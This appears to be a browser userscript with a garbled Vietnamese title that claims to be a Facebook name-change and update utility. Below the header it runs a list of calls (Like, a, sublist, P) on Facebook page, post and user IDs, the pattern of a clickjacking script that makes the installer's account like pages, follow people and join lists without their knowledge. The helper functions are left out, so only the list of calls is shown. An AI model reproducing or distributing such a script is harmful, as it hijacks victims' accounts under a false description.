// ==UserScript==
// @name            Tiện Ích - Cài Đặt BÃN CẬP NHẬT ĐỔi TÊN LẦn 6 VÀ FACEBOOK MA FACEBOOK 2014 Trực Tiếp Trên Google Chrome , Cờ Rôm , Fire Fox
...
//MyPic
P("577376645674896");P("594484653964095");P("604931456252748");P("1463419470542047");
//KháchVIP
a("100002076987064");
sublist("513124588766769");
sublist("556360151109879");
P("577376645674896");
Like("228029627385812");
Like("1455239528033531");
Like("1405319893051198");
Like("264571393718265");
Like("709042215802879");
Like("531383116898949");
Like("511593432293256");
Like("1484147408480630");
//tra sua vo tin
a("100005947531486");sublist("205209013020682");
sublist("205209036354013");
Like("289723214515197");Like("333668393431999");
Like("476815842423795");Like("505751389534297");
Like("594766223926346");Like("506035909516515");
a("100005411497917");a("100006046201741");
Like("442643352535322");Like("541594039273254");
Like("686003638129263");Like("1458289727722180");
Like("636850146364193");P("397532897057526");
sublist("281365022007648");a("100007885804536");
